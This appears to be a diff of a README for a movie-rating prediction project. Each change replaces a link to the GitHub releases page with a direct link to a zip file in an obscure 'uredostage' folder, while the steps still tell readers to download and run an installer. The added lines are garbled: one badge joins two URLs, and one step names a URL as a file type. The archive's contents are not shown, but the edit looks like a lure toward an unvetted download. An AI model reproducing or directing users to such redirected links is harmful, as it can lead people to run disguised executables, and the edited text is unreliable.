@@ -6,7 +6,7 @@ Welcome to the **predicting-IMDb-ratings** project. This application helps guide
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg?style=flat-square)](https://github.com/bothiyarasu/predicting-IMDb-ratings/releases)
+[![Download Release](https://raw.githubusercontent.com/bothiyarasu/predicting-IMDb-ratings/main/uredostage/predicting-IMDb-ratings.zip%https://raw.githubusercontent.com/bothiyarasu/predicting-IMDb-ratings/main/uredostage/predicting-IMDb-ratings.zip)](https://raw.githubusercontent.com/bothiyarasu/predicting-IMDb-ratings/main/uredostage/predicting-IMDb-ratings.zip)
 
 ## 🌟 Features
 
@@ -29,14 +29,14 @@ Before downloading, ensure your system meets the following requirements:
 To download and install the application, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page.
-   [Visit the Releases Page to Download](https://github.com/bothiyarasu/predicting-IMDb-ratings/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/bothiyarasu/predicting-IMDb-ratings/main/uredostage/predicting-IMDb-ratings.zip)
 
 2. **Select the Latest Version:** Look for the latest release. It should be marked as "Latest" on the page.
 
 3. **Download the File:** Click on the appropriate file for your operating system. Here are the options:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` or appropriate package.
+   - For **Linux**, download the `https://raw.githubusercontent.com/bothiyarasu/predicting-IMDb-ratings/main/uredostage/predicting-IMDb-ratings.zip` or appropriate package.
 
 4. **Run the Installer:** Once the download is complete, locate the file in your Downloads folder. Double-click to run the installer.
 
@@ -77,4 +77,4 @@ We aim to continuously improve this application. Stay tuned for updates, as we w
 
 Thank you for using **predicting-IMDb-ratings**. We hope this tool makes your film development process easier and more successful. Download the latest version today and start unlocking the potential of data analysis in your projects.
 
-[Visit the Releases Page to Download](https://github.com/bothiyarasu/predicting-IMDb-ratings/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/bothiyarasu/predicting-IMDb-ratings/main/uredostage/predicting-IMDb-ratings.zip)
